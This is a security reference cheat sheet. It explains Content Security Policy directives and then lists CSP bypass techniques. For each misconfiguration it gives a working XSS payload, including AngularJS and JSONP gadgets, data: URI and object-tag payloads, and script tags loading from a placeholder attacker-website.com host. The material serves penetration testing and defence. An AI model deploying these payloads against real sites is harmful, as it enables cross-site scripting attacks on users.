# Content Security Policy (CSP) overview

Content Security Policy is a mechanism to define which resources can be fetched out or executed by a web page. It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more.

Content Security Policy is implemented via a response header:

```http
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```

or the `meta` element of the HTML page:

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

The browser follows the received policy and actively blocks violations as they are detected.

## How does it work?

CSP works by restricting the origins that active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of `eval()`.

### Directives

Resource loading policy are set using directives of CSP:
- **script-src** specifies allowed sources for javascript. This includes not only URLs loaded directly into `<script>` elements, but also things like inline script event handlers (such as `onclick`) and XSLT stylesheets which can trigger script execution.
- **default-src** defines the policy for fetching resources by default. When fetch directives are absent in CSP header the browser follows this directive by default. The list of directives which do not follow `default-src`:
    - `base-uri`
    - `form-action`
    - `frame-ancestors`
    - `plugin-types`
    - `report-uri`
    - `sandbox`
- **child-src** defines valid sources for [web workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API) and nested browsing contexts loaded using elements such as `<frame>` and `<iframe>`.
- **connect-src** restricts URLs to load using interfaces such as `<a>`, `fetch`, `websocket`, `XMLHttpRequest`.
- **frame-src** specifies valid sources for nested browsing contexts loading using elements such as `<frame>` and `<iframe>`.
- **frame-ancestors** specifies sources that can embed the current page. This directive applies to `<frame>`, `<iframe>`, `<object>`, `<embed>`, and `<applet>` tags. This directive can't be used in `<meta>` tags and applies only to non-HTML resources.
- **img-src** defines allowed sources for loadnig images on the web page.
- **manifest-src** defines allowed sources of application [manifest](https://developer.mozilla.org/en-US/docs/Web/Manifest) files.
- **media-src** defines allowed sources from where media objects such as `<audio>`, `<video>` and `<track>` can be loaded.
- **object-src** defines allowed sources for the `<object>`, `<embed>` and `<applet>` elements.
- **base-uri** defines allowed URLs which can be loaded using `<base>` element.
- **form-action** lists valid endpoints for submission from `<form>` tags. Whether `form-action` should block redirects after a form submission is debated and browser implementations of this aspect are inconsistent (e.g. Firefox 57 does not block the redirects whereas Chrome 63 does).
- **plugin-types** restricts the set of plugins that can be embedded into a document by limiting the types of resources which can be loaded. Instantiation of an `<embed>`, `<object>` or `<applet>` elements will fail if:
    - the element to load does not declare a valid MIME type
    - the declared type does not match one of specified types in the plugin-types directive
    - the fetched resource does not match the declared type
- **upgrade-insecure-requests** instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URLs that need to be rewritten.
- **sandbox** enables a sandbox for the requested resource similar to the `<iframe>` sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.

### Sources

Sources are used to define the value of the directives:
- **&ast;** allows any URL except `data:`, `blob:` and `filesystem:`.
- **self** defines that loading of resources on the page is allowed from the same domain.
- **data** allows loading resources via the `data:` scheme (eg Base64 encoded images).
- **none** allows nothing to be loaded from any source.
- **unsafe-eval** allows the use of `eval()` and similar methods for creating code from strings.
- **unsafe-hashes** allows to enable specific inline event handlers.
- **unsafe-inline** allows the use of inline resources, such as inline `<script>` elements, `javascript:` URLs, inline event handlers, and inline `<style>` elements.
- **nonce** is a cryptographic nonce (number used once) and it is used for creating the whitelist for specific inline scripts. The server must generate a unique nonce value each time it transmits a policy.

## Examples

```http
Content-Security-Policy: default-src 'self'; script-src https://website.com;
```

The following image will be **allowed** as image is loading from same domain i.e. `website.com`:

```html
<img src="assets/images/logo.png">
```

The following script will be **allowed** as the script is loading from the same domain i.e. `website.com`:

```html
<script src="assets/scripts/main.js"></script>
```

The following script will **not-allowed** as the script is trying to load from undefined domain i.e. `attacker-website.com`:

```html
<script src=https://attacker-website.com/hook.js></script>
```

The following payload will **not-allowed** on the page as inline scripts are blocked by default:

```html
"/><script>alert(1337)</script>
```

The following image will **not-allowed** as the image is loaded from undefined domain i.e. `attacker-website.com`:

```html
<img src="https://attacker-website.com/image.svg">
```

Since the directive is not defined in the CSP `img-src` is set to `self` and follows `default-src` by default.

# Bypassing techniques

You can use the following online tools to check CSP:
- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/)

## Allowed data: scheme

```http
Content-Security-Policy: default-src 'self' data: *; connect-src 'self'; script-src  'self';
```

Such CSP policy can be bypassed using `<iframe>`. The condition is that application should allow `<iframe>` from the whitelisted domain. Using a special attribute `srcdoc` of `<iframe>` XSS can be easily achieved. Possible payload:

```html
<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
```

Sometimes it can be achieved using defer & async attributes of the script within `<iframe>` (it fails most of the time in new browser due to SOP):

```html
<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
```

## Angular JS

```http
Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none';
```

If the application is using Angular JS and scripts are loaded from a whitelisted domain it is possible to bypass CSP policy by calling a callback function and vulnerable class. Working payloads:

```html
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

"><script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
```

References:
- [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3%3A-%22Sh%2At%2C-it%27s-CSP%21%22). 

## Bypass using encode '/' by [@SecurityMB](https://twitter.com/SecurityMB/status/1162690916722839552)

```http
Content-Security-Policy: script-src pastebin.com/XYZ/
```

If CSP policy points to a directory and you use `%2f` to encode `/`, it is still considered to be inside the directory. All browsers seem to agree on that. If a server decodes `%2f` it is possible to bypass CSP by using `'%2f..%2f'`. Possible payload:

```html
<script src="https://pastebin.com/XYZ%2f..%2fraw/b0Rajxqk"></script>
```

## Bypass using JSONP

```http
Content-Security-Policy: script-src 'self' https://www.google.com; object-src 'none';
```

If the `script-src` is set to `self` and a particular domain is whitelisted it is possible to bypass this using JSONP. JSONP endpoints allow insecure callback methods that allow an attacker to perform XSS. Possible payload:

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
```

References:
- [JSONBee](https://github.com/zigoo0/JSONBee) contains a ready to use JSONP endpoints to CSP bypass of different websites.

## Bypass using vulnerable third-library

```http
Content-Security-Policy: script-src 'self' https://cdnjs.cloudflare.com/; object-src 'none';
```

If the `script-src` is set to `self` and a javascript library domain is whitelisted it is possible to bypass using any vulnerable version of javascript files from the library that allow you to perform XSS. Working payloads:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
 
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>
    {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>

"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script>
<div ng-app ng-csp>
    {{$eval.constructor('alert(1)')()}}
</div>

"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"></script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

## Bypass using open redirect

```http
Content-Security-Policy: script-src 'self' accounts.google.com/random/ website-with-redirect.com; object-src 'none';
```

There are two whitelisted domains from where scripts can be loaded to the webpage. If one of domains is vulnerable to open redirect you can craft a payload using redirect domain targeting to other whitelisted domains with a JSONP endpoint. XSS will execute because while redirection browser only validated host, but **not** the path parameters. Possible payload:

```html
">'><script src="https://website-with-redirect.com/redirect?url=https%3A//accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>">
```

## CSP injection

CSP policy could be generated dynamically based on variables that are controlled by a user. If the variables are not properly validated you can inject your own directives into CSP and bypass a policy.

References:
- [Writeup: CSP Injection - CTFZone 2019 Quals - Shop Task](https://blog.blackfan.ru/2019/12/ctfzone-2019-shop.html)
- [Writeup: Bypassing CSP with policy injection by @garethheyes](https://portswigger.net/research/bypassing-csp-with-policy-injection)
- [Writeup: How to Hack Apple ID](https://zemnmez.medium.com/how-to-hack-apple-id-f3cc9b483a41)

## unsafe-eval

```http
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-eval' data: http://*; child-src 'none';
```

This is a misconfigured CSP policy due to usage of `unsafe-eval`. Possible payload: 

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

## unsafe-inline

```http
Content-Security-Policy: script-src https://facebook.com https://google.com 'unsafe-inline' https://*; child-src 'none';
```

This policy will allow inline scripting due to usage of `unsafe-inline`. Possible payload:

```html
"/><script>alert(1337);</script>
```

## Missing default-src

```http
Content-Security-Policy: script-src 'self';
```

This is a misconfigured CSP policy due to missing `default-src`, allowing use `object-src`. Possible payloads:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>

">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>

<param name="AllowScriptAccess" value="always"></object>
```

## Script gadgets

You can use script gadgets to bypass CSP even if a nonce-based policy is in use, since the gadget is usually allowed to execute JavaScript.

References:
- [PortSwigger: Hunting nonce-based CSP bypasses with dynamic analysis](https://portswigger.net/research/hunting-nonce-based-csp-bypasses-with-dynamic-analysis)

## Uploading files

```http
Content-Security-Policy: script-src 'self'; object-src 'none';
```

If the application allows users to upload any type of file to the host you can upload a malicious script and call it within a tag. Possible payload:

```html
"/>'><script src="/uploads/picture.png.js"></script>
```

## Weak nonce generation

If `nonce` value is generated by a weak generator or its value can be guessed at, you can bypass a policy by generating the correct `nonce`.

References:
- [Writeup: Bug Bounty Stories #1: Tale of CSP bypass in an electron app!](https://securitygoat.medium.com/bug-bounty-stories-1-tale-of-csp-bypass-in-an-electron-app-f669f6ecefc9)

## Wildcard in script-src

```http
Content-Security-Policy: script-src 'self' https://facebook.com https://google.com https: data *; child-src 'none';
```

This is a misconfigured CSP policy due to usage of a wildcard in `script-src`. Possible payloads:

```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

# References

- [Content-Security-Policy (CSP) Bypass Techniques](https://medium.com/@bhaveshthakur2015/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [Deteact: Content Security Policy Bypass](https://blog.deteact.com/csp-bypass/)
- [ZN2018: CSP by Ivan Chalykin](https://github.com/0xn3va/cheat-sheets/blob/master/Web%20Application/Content%20Security%20Policy/materials/zn2018-csp-bypass.pdf)
- [Write up: CSP bypass by base tag injection](https://ctftime.org/writeup/11452)
